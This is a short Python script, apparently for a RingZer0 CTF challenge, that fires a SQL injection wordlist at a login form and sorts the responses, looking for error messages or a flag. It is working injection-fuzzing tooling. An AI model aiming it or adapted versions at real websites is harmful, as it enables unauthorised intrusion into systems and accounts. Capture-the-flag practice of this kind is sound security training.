#!/usr/bin/env python

import requests
import urllib.request, urllib.parse, urllib.error
from bs4 import BeautifulSoup
import sys

# Modify the following according to the given
# problem
interactive = True 
url='https://ringzer0ctf.com/challenges/52'
wordfile='/usr/share/wordlists/wfuzz/Injections/SQL.txt'
cookies = {'PHPSESSID':'s2dnqhc3ar4odqkn2vjtqgook1'}

def main():

#    if (interactive):
#        interactive()
#        sys.exit(0)

    with open(wordfile, 'r') as f:
        wordlist = f.readlines()
    wordlist.append('\\')

    for word in wordlist:
        word = word.replace('\r\n', '')
        new = word
        new_password = word

        data = {'username': 'impossibletoguess', 'password':new_password}
        r = requests.post(url = url, data = data, cookies = cookies)
        html = r.text

        # Modify the follwing filters according
        # to the given problem
        if 'Wrong username' in html:
            print('WRONG USERNAME:\t\t %s' % word)
        elif 'account has been created' in html:
            print('ACCOUNT CREATED:\t\t %s' % word)
        elif 'account already exists' in html:
            print('ACCOUNT EXISTS:\t\t %s' % word)
        elif 'Seems like your not an admin' in html:
            print('LOGGED IN NOT ADMIN:\t\t %s' % word)
        elif 'Illegal characters detected' in html:
            print('ILLEGAL:\t\t %s' % word)
        elif 'Invalid username' in html:
            print('INVALID USERNAME:\t\t %s' % word)
        elif 'You have an error' in html:
            print('ERROR:\t\t %s' % word)
            #interactive()
        elif 'Wrong password for' in html:
            print('WRONG PASSWORD:\t\t %s' % word)
            print_alert(r.text)
        else:
            print('OTHER:\t\t %s' % word)
            print_alert(r.text)
            break

def interactive():
    word1 = input("Value for word1: ")
    while(word1 != "quit"):
        data = {'username': word1}
        r = requests.post(url = url, data = data, cookies = cookies)
        html = r.text
        print_alert(html)
        word1 = input("Value for word1: ")

def print_alert(html):
    # Modify this filter to what you believe our loot
    # should look like
    if("FLAG" in html):
        print(html)
    soup = BeautifulSoup(html, 'html.parser')
    # Modify the following functions to print the
    # output message that you are looking for
    results = soup.find("div", {"class":"alert"})
    if (results != None):
       result = results.text.strip()
       print(result)


main()
